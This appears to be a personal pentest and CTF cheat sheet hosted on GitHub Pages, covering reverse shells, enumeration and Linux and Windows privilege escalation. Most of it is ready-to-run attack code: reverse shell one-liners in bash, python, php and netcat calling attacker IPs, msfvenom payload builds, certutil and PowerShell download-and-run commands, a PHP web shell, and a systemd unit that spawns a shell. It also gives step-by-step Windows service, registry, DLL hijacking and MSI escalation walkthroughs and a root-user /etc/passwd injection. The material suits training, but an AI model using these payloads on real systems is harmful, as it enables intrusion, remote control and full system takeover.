## Pentest make easy

The purspose of this site is to make the Penetration testing and Privilege escation make easy. There are several exploits and various writeup avilable. But when it is needed its very difficult to find out the exact exploit and the writeup.

In this site I am attempting to collect most of the common exploits that appear in CTF and other exinvornments.

### [SQL Injection](https://dayaramb.github.io/resources/)

### [Getting Revese shell](https://github.com/dayaramb/dayaramb.github.io/tree/master/reverse_shells/README.md)

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

Once this is running, enter this command to start the reverse shell

```bash
Start-Process "shell-name.exe"
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
```
### Windows Copy command
```bash 
certutil.exe -urlcache -split -f http://10.10.14.8/winPEAS-x64.exe winPEAS-x64.exe
```

### PHP System Command:
```php
<?php echo(system($_GET["cmd"])); ?>
```
### Reverse shells One liner:

### Bash TCP

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

### Bash UDP

```bash
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

## Upload File directly
```bash
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```
To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

### php
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'");
```
### netcat OpenBSD

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

## References

* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Spawning a TTY Shell](http://netsec.ws/?p=337)
* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
### [Reverse Shell Collection](https://github.com/dayaramb/pentest-tools/tree/master/reverse_shells)



## Enumerations
### DNS
if the port 53 is open try to find  if there are some name resolved. /etc/resolv.conf ---> victim IP

dig -x <victim-ip>

Eg. dig cronos.htb any
For whole zone tranasfer dig axfr @10.10.10.13 cronos.htb

## Random Exploit collection

Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.

|s.no| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
| --- | --- | --- | --- | --- | --- | --- |
|1.| Jenkins  | default username and pass |Running in Windows | [Nishang](https://github.com/samratashok/nishang) to gain initial access.| Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:```powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port``` You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server|[jenkis writeup](https://executeatwill.com/2020/04/01/TryHackMe-Alfred-Walkthrough/) |
| 2.|ThinVNC  1.0b1  | Authentication Bypass CVE-2019-17662 | VNC running in port 3389 and can be exploited using password lookup, can be accessed using Browser|[Exploit 47519](https://www.exploit-db.com/exploits/47519). Simply using Burp suite also reveals the password here as well.  |to get reverse shell first get the password of admin user and then login. After you can use nc.exe to connect to the Kali. |[Video](https://www.youtube.com/watch?v=uNll_EYri0A)|
|3.|Haraka SMTP < 2.8.9 |Remote Command Execution |runing in different port than 25 in Linux |[Exploit 41162](https://www.exploit-db.com/exploits/41162) only need to change the port |```python 41162.py -c "php -r '\$sock=fsockopen(\"192.168.100.1\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t root@haraka.test -m 192.168.200.1``` or bash method.  |[Similar HTB writeup](https://0xdf.gitlab.io/2019/04/13/htb-redcross.html)|
|4.|BlogEngine 3.3.6.0|Authentication Bypass & Directory Traversal [CVE-2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714)|Need to guess the password using Hydra "hydra -l \<username> -P /usr/share/wordlists/\<wordlist> \<ip> http-post-form" Most of the command consists of the string after “http-post-form”. This string has three parts divided by colons — “path to the login form page : request body : error message indicating failure” use burp suite to get all the details.|Login using the admin and brute forced pass. Get the verison of BlogEngine You have to upload the file  PostView.ascx to access the shell. Follow the exploit [46353](https://www.exploit-db.com/exploits/46353)| Modify the exploit to have ip. | [Writeup](https://medium.com/@nickbhe/tryhackme-hackpark-writeup-db34b7957bef)|
|5. |PHP log poisoning | https://www.hackingarticles.in/apache-log-poisoning-through-lfi/ | https://0xdf.gitlab.io/2018/09/08/htb-poison.html | --- | --- | --- |
|6.|IIS6.0 | [Zero day exploit to get reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell) |- |- |-|
|7.|Drupal7.x|7.x Module Services - Remote Code Execution           | php/webapps/41564.php |- | - |change the urllink, change the system command so you can execute cmd and change to rest |



## Linux Privilege Escalation

### SUDO
sudo is very dangerous. 
### sudo in more and less
```bash
sudo -l 
(ALL) /usr/bin/less

sudo less /var/log/kern.log
:!/bin/bash
```

### sudo in find
```bash
sudo find /var/log -name kern.log  -exec /bin/bash -i \;
```

## Abusing Permissions.
Look at startup scripts, possible cron jobs, user .bashrc's etc. and see if anythin is called we can write to. It might be an errant chmod -R

 chmod is either your best friend or your worst enemy.

## scenario:
.ssh is in the backup directory. key might be the trusted key. 


### By default home direcotry is created with world readable. 


#### SUID /bin/systemctl
create revshell.service as:
```bash
revshell.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.26.129/4444 0>&1"
[Install]
WantedBy=multi-user.target

```
#### systemctl
```bash
systemctl link /tmp/revshell.service
Created symlink from /etc/systemd/system/revshell.service to /tmp/revshell.service.
$ systemctl enable --now /tmp/daya.service
Created symlink from /etc/systemd/system/multi-user.target.wants/revshell.service to /tmp/revshell.service.
Job for daya.service failed because the control process exited with error code. See "systemctl status revshell.service" and "journalctl -xe" for details.

systemctl start revshell.service

```
After it runs successfully you will get reverse shell back to kali.

### /etc/passwd world writable
* Simply appending in /etc/passwd and making the UID 0 will provide you the root access to system. 
* Generate the password:  perl -le 'print crypt("foo", "aa")'
to set the password to foo.
* daya:aaKNIEDOaueR6:0:0:daya:/tmp/daya:/bin/bash
### Useful Commands:
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=[your_ip] LPORT=[listening_port] -f exe -o [shell_name.exe]

certutil.exe -urlcache -split -f http://10.2.26.129/winPEAS-x64.exe winPEAS-x64.exe

certutil.exe -urlcache -split -f http://10.2.26.129/shell.exe shell.exe


### Cron job running by root.
Eg. * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

In this case you can simply replace the /var/www/laravel/artisan file with one liner php reverse shell.

## Windows Privilege Escalation
The ultimate goal is to gain a shell running as administrator or system users. Windows privilege escalations can be simple(eg. a kernel exploits) or require a lot of reconnaissance on the compromised system. 
In lot of cases it may not rely on a single misconfigurations, but may require you to think and combine multiple configurations. 

## General Conecpts:
All privilege esclations are effectively exmaples of a access control violations. Access control and user permission are intrinsically linked. When focusing on privilege escalations in windows, understanding how windows handles permission is very important. 

## Permission in windows. 
Two types of Account: 
User account: Administrator and general account. 
Service account: Used for running services in windows system. System account is the default service account which has highest privileges. Other default service account includes NETWORK SERVICE and LOCAL SERVICE. 

## Groups

User accounts can belong to multiple groups, and groups can have multipel users. 
Groups allow easier access control to resources.
Reular groups(eg. administrator, Users) have a list of members. 

Pseudo groups (eg. "Authenticated Users) have a dynamic list of members which changes based on certain interactions. 

## Resource
In windows there are multiple types of resoure (also known as objects):
** Files/Directories.
** Registry Entries
** Services
Whether a user and or/group has a permission to perform a certain action on a resource depends on that resossurce's ACL(access control list)

## ACL & ACE
Permissions to access a certain resource in Winndows are controlled by the access control list (ACL). Each ACL is made up of zero or more access control entries. (ACEs)

Each ACE defines the relationship between a principal (eg. a user,group) adn a certain access right. 


## Tools
### Powerup and Sharpup
They are similar tools to hunt for specific privilege escalations.
```bash
powershell -exec bypass
.\powerup.ps1
-Invoke-Allchecks
```
### sharup (Binary)
.\sharup
### winpeas

Before running, we need to add a registry key and then reopen the command prompt:
* reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

Run all checks while avoiding time-consuming searches:

* .\winPEASany.exe quiet cmd fast
Run specific check categories:

* .\winPEASany.exe quiet cmd systeminfo

### Kernel Exploits:
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | le


Best tool. 
winpeash -h


## Services
Services are simply programs that run in the background, accepting input or performing regular tasks. 
If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to the command execution with SYSTEM privileges as well. 

## Service Command
Query the configuration of a service:

```bash
 sc.exe qc <name>
```
Query the current status of a service:

```bash 
sc.exe query <name>
```
Modify a configuration option of a service:

```bash
 sc.exe config <name> <option>= <value>
```
Note the option name must be immediately followed by an equal sign and the space before the value. 
Start/Stop a service:

```bash
 net start/stop <name>
 ```

## 5 Types of Servie Misconfigurations:
1. Insecure Service Properties
2. unquoted Service Path
3. Weak Registry Permission
4. Insecure Service Executables
5. DLL Hijacking

### accesschk

## 1. Insecure Service Permission
If our user has permission to change the configuration of a
service which runs with SYSTEM privileges, we can change
the executable the service uses to one of our own.
Potential Rabbit Hole: If you can change a service
configuration but cannot stop/start the service, you may not
be able to escalate privileges!


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o rev.exe

certutil.exe -urlcache -split -f http://10.10.14.8/winPEAS-x64.exe winPEAS-x64.exe

net localgroup administrators <username> /add

python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .

# Run winPEAS to check for service misconfigurations:

winPEASany.exe quiet servicesinfo
Note that we can modify the “daclsvc” service.We can confirm this with accesschk.exe:

accesschk.exe /accepteula -uwcqv user daclsvc

user=username
daclsvc name of the service. 

#Check the current configuration of the service:
sc qc daclsvc

C:\Users\user\Desktop\tools\tools>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


It seems that the service is running in System Privileges. (SERVICE_START_NAME : LocalSystem)

#Check the current status of the service:
sc query daclsvc

Reconfigure the service to use our reverse shell executable:
sc config daclsvc binpath= "\"c:\Privesc\rev.exe\""

Start a listener on Kali, and then start the service to trigger the exploit:
QueryServiceConfig SUCCESS                                                                                                  
                                                                                                                                 
SERVICE_NAME: daclsvc                                                                                                            
        TYPE               : 10  WIN32_OWN_PROCESS                                       


        BINARY_PATH_NAME   : "c:\Privesc\rev.exe"                                                                                
        LOAD_ORDER_GROUP   :                                                                                                     
        TAG                : 0                                                                                                   
        DISPLAY_NAME       : DACL Service                                                                                        
        DEPENDENCIES       :                                                                                                     
        SERVICE_START_NAME : LocalSystem 

net start daclsvc
```

## 2. Unquoted Service Path

Executables in windows can be run without using their extension. For eg. whoami.exe can be run by just whoami.
Some executables takes arguments, spearated by the spaces. eg.
```bash
someproge.exe arg1 arg2 arg3...
```
This behavior leads to the ambiguity when using the absolute paths that are unquoted and contain spaces. Consider the following unquoted path:
C:\Program Files\Some Dir\SomeProgram.exe
To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe” Windows resolves this ambiguity by checking each of the possibilities in turn.

If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

### Privilege Escalations:

accesschk.exe /accepteula -ucqv user unquotedsvc
```bash

#Run winPEAS to check for service misconfigurations:
.\winPEASany.exe quiet servicesinfo
#Note that the “unquotedsvc” service has an unquoted path that also contains spaces:

C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

#Confirm this using sc:
sc qc unquotedsvc

# Use accesschk.exe to check for write permissions:
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
# Copy the reverse shell executable and rename it appropriately:
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path
Service\Common.exe"

# You can alos check the permission with icacls.

icacls "c:\Program Files\Unquoted Path Service"
# Start a listener on Kali, and then start the service to trigger the exploit:
net start unquotedsvc

```


## 3.  Weak Registry Permission
The Windows registry stores entries for each service.
Since registry entries can have ACLs, if the ACL is
misconfigured, it may be possible to modify a service’s
configuration even if we cannot modify the service
directly.

#### winpeas output
```powershell

winPEASany.exe quiet servicesinfo
```
```bash

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions                                                                                                                 
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])


# Run winPEAS to check for service misconfigurations:
 .\winPEASany.exe quiet servicesinfo

# Note that the “regsvc” service has a weak registry entry. We can confirm this with

PowerShell:
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List

PS C:\PrivEsc>  Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
 Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
Audit  : 
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CIIO;GR;;;AC)(A;OICI;KR;;;AC)(A;CIIO;GR;
         ;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;OICI
         ;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```
```bash
# Alternatively accesschk.exe can be used to confirm:
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS


# Query the register. 
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc 

reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc 

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc\Security

# Overwrite the ImagePath registry key to point to our reverse shell executable.
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d
C:\PrivEsc\reverse.exe /f

#This has same effect as chaning the bin path of the service. 
#Start a listener on Kali, and then start the service to trigger the exploit:
> net start regsvc
```

## 4. Insecure Service Executables

If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system

### Privilege Escalation
```bash
Run winPEAS to check for service misconfigurations:
> .\winPEASany.exe quiet servicesinfo
2. Note that the “filepermsvc” service has an executable which appears to be
writable by everyone. We can confirm this with accesschk.exe:
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
3. Create a backup of the original service executable:
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp 
Copy the reverse shell executable to overwrite the service executable:
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
5. Start a listener on Kali, and then start the service to trigger the exploit:
> net start filepermsvc
```

### 5. DLL Hijacking
A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.
A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the
PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.

```bash
Use winPEAS to enumerate non-Windows services:
> .\winPEASany.exe quiet servicesinfo
2. Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
> .\accesschk.exe /accepteula -uvqc user dllsvc
3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We
can confirm this manually:
> sc qc dllsvc
4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
5. Add a new filter on the Process Name matching dllhijackservice.exe.
6. On the main screen, deselect registry activity and network activity.
7. Start the service:
> net start dllsvc
8. Back in Procmon, note that a number of “NAME NOT
FOUND” errors appear, associated with the hijackme.dll file.
9. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.
10. On Kali, generate a reverse shell DLL named hijackme.dll:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
> net stop dllsvc
> net start dllsvc

```

## AutoRuns
### AutoRuns
Windows can be configured to run commands at startup, with elevated privileges.
These “AutoRuns” are configured in the Registry.

If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
```bash
1. Use winPEAS to check for writable AutoRun executables:
> .\winPEASany.exe quiet applicationsinfo
2. Alternatively, we could manually enumerate the AutoRun executables:
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
and then use accesschk.exe to verify the permissions on each one:
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
4. Copy our reverse shell executable to overwrite the AutoRun executable:
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.
```

## AlwaysInstallElevated
MSI files are package files used to install applications.These files run with the permissions of the user trying to install them.
Windows allows for these installers to be run with elevated (i.e. admin) privileges.

If this is the case, we can generate a malicious MSI file which contains a reverse shell.
The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
and the current user:

HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

If either of these are missing or disabled, the exploit will not work.

```bash
1. Use winPEAS to see if both registry values are set:
> .\winPEASany.exe quiet windowscreds
2. Alternatively, verify the values manually:
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
4. Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```



### Iperius Backup 6.1.0 - Privilege Escalation
Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.

### SystemScheduler
Inside c:\Program Files (x86)\SystemScheduler we can found a list of application scheduled. It is observed that details logs in c:\Program Files (x86)\SystemScheduler/events. 08/29/2020  07:15 AM            16,107 20198415519.INI_LOG.txt Here in this scenario, message.exe we can overwrite it. Possible DLL hijacking. Create shell.exe and overwrite message.exe with shell.exe. You will get admin reverse shell.

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/dayaramb/dayaramb.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
